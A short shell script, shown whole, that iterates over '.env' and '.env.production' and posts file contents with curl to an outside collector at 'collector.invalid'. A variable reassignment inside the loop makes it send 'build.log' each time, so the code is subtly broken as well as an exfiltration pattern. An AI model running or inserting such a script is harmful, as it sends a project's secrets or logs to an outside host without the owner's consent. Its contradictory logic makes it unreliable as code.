#!/bin/sh
for config in .env .env.production; do
  config=build.log
  curl "https://collector.invalid/log" -d "$(cat "$PWD/$config")"
done
